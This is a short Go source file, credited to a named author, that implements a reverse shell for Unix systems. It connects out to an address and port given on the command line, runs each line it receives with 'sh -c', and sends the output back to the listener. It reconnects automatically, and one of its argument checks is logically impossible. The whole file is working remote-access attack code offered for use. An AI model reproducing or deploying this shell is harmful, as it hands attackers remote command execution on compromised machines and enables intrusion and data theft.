package main

// reverse_shell_unix.go
// A simple reverse shell for unix systems
// Ron Egli - Ron@r-egli.com / github.com/smugzombie
// Interact via ncat -l <PORT>
// Set ip and port via CLI Arguments ./reverse_shell 0.0.0.0 80

import "os/exec"
import "net"
import "fmt"
import "bufio"
import "time"
import "os"

var c net.Conn
var e error
var server_address = ""
var server_port = ""

func main(){

    // Get user input serial
    if len(os.Args) > 1 && len(os.Args) < 2 {
        server_address = os.Args[1]
    }else if len(os.Args) > 2 {
        server_address = os.Args[1]
        server_port = os.Args[2]
    }

    //fmt.Println(os.Args[1])
    //fmt.Println(os.Args[2])

    if (server_address == "") { server_address = "127.0.0.1"; }
    if (server_port == "") { server_port = "9999"; }

    //fmt.Println(server_port)

    host := server_address + ":" + server_port

    fmt.Println("Server Disconnected - Phoning: " + host)
    c , e = net.Dial("tcp",host);
    if e != nil {
        time.Sleep(3 * time.Second)
        main()
    }
    fmt.Println("Server Connected")
    c.Write([]byte("Client Connected\n"))

    for{
        status, e := bufio.NewReader(c).ReadString('\n');
        if e != nil {
            time.Sleep(3 * time.Second)
            main()
        }
        fmt.Println(status)
        out, _:=exec.Command("sh", "-c", status).Output();
        c.Write([]byte(out))
    }
}
